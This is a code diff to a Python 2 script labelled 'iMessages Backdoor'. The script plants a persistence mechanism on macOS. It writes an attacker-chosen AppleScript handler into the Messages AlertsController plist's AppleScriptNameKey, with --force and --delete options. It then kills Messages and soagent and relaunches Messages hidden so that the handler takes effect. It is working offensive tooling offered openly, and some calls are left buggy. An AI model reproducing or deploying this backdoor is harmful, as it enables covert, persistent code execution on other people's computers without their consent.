@@ -4,6 +4,7 @@ import plistlib as PL
 import sys
 import argparse
 import platform
+import time
 
 #Argument Parsing
 parser = argparse.ArgumentParser(description='iMessages Backdoor')
@@ -15,9 +16,62 @@ arguments = parser.parse_args()
 
 #Add a kill for the messages application.
 #Initial environment information gathering.
+templateFile = ""
 homedir = os.path.expanduser('~')
+path = homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist"
 scriptspath = None
 currentScript = ""
+newScript = arguments.plist
+
+def get_key(path):
+    p = subprocess.Popen(["defaults","read",path,'AppleScriptNameKey'],
+                         stdout=subprocess.PIPE,
+                         stderr=subprocess.STDOUT)
+    return iter(p.stdout.readline, b'')
+    
+def restart_procs():
+    #dostuff
+    subprocess.Popen(["killall","Messages"],                         
+                             stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT)
+    subprocess.Popen(["killall","soagent"],
+                             stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT)
+    subprocess.Popen(["open","-j","/Applications/Messages.app"],
+                         stdout=subprocess.PIPE,
+                         stderr=subprocess.STDOUT)
+
+
+def failed_exit(step,e):
+    print "[!] An error has occured attempting to " + step
+    print str(e)
+    exit()
+
+def write_key(newHandler, path):
+    print "[+] Writing new AppleScript event handler to " + path
+    subprocess.Popen(["defaults","write",path,'AppleScriptNameKey',"-string", newHandler],
+                         stdout=subprocess.PIPE,
+                         stderr=subprocess.STDOUT) 
+                        
+    print "[+] Write key successful"
+
+def check_if_exists(path): 
+    if os.path.isfile(path):
+        return True
+    else:
+        return False
+def create_soagent_file():
+    print "Does this even matter?"
+    #Todo: Create a file and maybe have it activate a user.
+ 
+ 
+def delete_key(oldScript, path):
+    print "[+] Deleting the old key from the com.apple.messageshelper.AlertsController.plist file:"
+    subprocess.Popen(["defaults","delete",path,'AppleScriptNameKey'],
+                          stdout=subprocess.PIPE,
+                          stderr=subprocess.STDOUT)
+
+
 
 #Check version of OSX we're running
 #~/Library/Application Scripts/Com.apple.iChat for any macs newer than 10.7
@@ -28,97 +82,52 @@ if int(macversion[0]) == 10 and int(macversion[1]) <= 7:
     scriptspath = homedir + "/Library/Scripts/Messages/"
     print "[INFO] Using scripts path: " + scriptspath
 elif int(macversion[0]) == 10 and int(macversion[1]) == 12:
-    scriptspath = homedir + "Library/Application Scripts/Com.apple.iChat/"
-    print "[INFO] Using scripts path: " + scriptspath
+    scriptspath = homedir + "/Library/Application Scripts/Com.apple.iChat/"
+    print "[INFO] Using scripts path: " + scriptspath 
+                          
+#Check if the plist file exists so that we can write to it.
 
+if check_if_exists(path):
+    print "[+] Plist file found! Using file: " + path
+else:
+    print "[!] File Not Found, time to bail."
+    failed_exit("check if the plist file exists, the file: " + path + " was not found!")
 
-#--------------------------------------------------------------------------------------------------------
-#Convert the file into a readable format. I wonder if this is required with plistlib
-#Import the plist file so that it can be modified.
-#--------------------------------------------------------------------------------------------------------
-try:
-    subprocess.Popen("plutil -convert xml1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()
-    alertsPlist = PL.readPlist(homedir+'/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist')
-except:
-    print "[ERROR] Could not read the AlertsController plist!"
-    quit()
+#Check to see if there's a value already written to the plist file.
+for line in get_key(path):
+    currentScript += line
 
-if arguments.verbose == True:
-    with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
-        print fin.read()
+#If the delete flag is set, check to see if it exists already, if not exit, if it does then delete it and exit.
+if arguments.delete==True:
+    try:
+        if "does not exist" in currentScript:
+            failed_exit("deleting the key, no key is currently set!")
+        else:
+            delete_key(currentScript, path)
+            successful_exit()
+    except Exception, e:
+        failed_exit("delete the old key from the plist",e)
 
-#-------------------------------------------------------------------------------------------------------- 
-# Try to read AppleScriptNameKey value.
-#-------------------------------------------------------------------------------------------------------- 
-try:
-    currentScript = alertsPlist["AppleScriptNameKey"]
-except:
-    #An exception could potentially mean the key just doesn't exist. To Do: Clean this check up.
-    pass
- 
-  
-#-------------------------------------------------------------------------------------------------------- 
-# Check if AppleScriptNameKey exists or not. If it does exist...
-#--------------------------------------------------------------------------------------------------------  
-if currentScript:
-    print "[INFO] There is currently an AppleScriptNameKey set and its value is: " + str(currentScript)
-    #Delete and quit.
-#-------------------------------------------------------------------------------------------------------- 
-# Check if the --delete flag is set. If it is, delete the key and write the plist file.
-#--------------------------------------------------------------------------------------------------------  
-    if arguments.delete==True:
-        #delete
-        print "Removing the AppleScriptNameKey from the plist..."
-        del alertsPlist["AppleScriptNameKey"]
-        print "Writing new plist file to the Preferences directory..."
-        PL.writePlist(alertsPlist, homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist")
-        #------------------------------------------------------------------------------------------------
-        #Verbose check.
-        #------------------------------------------------------------------------------------------------
-        if arguments.verbose == True:
-            with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
-                print fin.read()
-        subprocess.Popen("plutil -convert binary1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()
-        exit()
-#-------------------------------------------------------------------------------------------------------- 
-# Check if the --force flag is set. If it is, overwrite the current key with the new value.
-#--------------------------------------------------------------------------------------------------------   
-    elif arguments.force == True:
-        print "[+] Removing the users current script and replacing it with our own..."
-        alertsPlist["AppleScriptNameKey"] = str(arguments.plist)
-        PL.writePlist(alertsPlist, homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist")
-        #------------------------------------------------------------------------------------------------
-        #Verbose check.
-        #------------------------------------------------------------------------------------------------
-        if arguments.verbose == True:
-            with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
-                print fin.read()
-#-------------------------------------------------------------------------------------------------------- 
-# If the --force flag is not set, display a message and exit.
-#--------------------------------------------------------------------------------------------------------  
+if "does not exist" in currentScript:
+    print "[+] No current applescript handlers set."
+    try:
+        write_key(newScript, path)
+    except Exception, e:
+        failed_exit("write new script into the plist.",e)
+else:
+    print "Current Handler Found: " + currentScript
+    if arguments.force==True: #Bug here, if the key gets deleted, it never gets re-written.
+        try:
+            delete_key(currentScript, path)
+        except Exception, e:
+            failed_exit("delete the old key from the plist",e)
+        restart_procs()
+        try:
+            write_key(newScript, path)
+        except Exception, e:
+            failed_exit("write new script into the plist.",e)
     else:
-        print "[STOP] There is already a value set for AppleScriptNameKey use the --force option to change that value."
-        print "[+] Converting the plist back into binary..."
-        subprocess.Popen("plutil -convert binary1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()
-        quit() 
-#-------------------------------------------------------------------------------------------------------- 
-# If AppleScriptNameKey does not already exist...
-#--------------------------------------------------------------------------------------------------------   
-elif currentScript == "":
-    print "[INFO] No current AppleScriptNameKey value"
-    alertsPlist["AppleScriptNameKey"] = arguments.plist
-    PL.writePlist(alertsPlist, homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist")
-    #------------------------------------------------------------------------------------------------
-    #Verbose check.
-    #------------------------------------------------------------------------------------------------
-    if arguments.verbose == True:
-        with open(homedir + '/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist', 'r') as fin:
-            print fin.read()
-    
-#Restart Messages.app
-print "[+] Converting the plist back into binary..."
-subprocess.Popen("plutil -convert binary1 " + homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist", shell=True, stdout=subprocess.PIPE).stdout.read()
-
-print "[+] Restarting Messages.app"
-subprocess.Popen("killall messages", shell=True, stdout=subprocess.PIPE).stdout.read()
-
+        failed_exit("write new script into the plist, a handler already exists. To overwrite the current handler and continue, use the --force flag.","")
+time.sleep(5)
+restart_procs()
+exit()
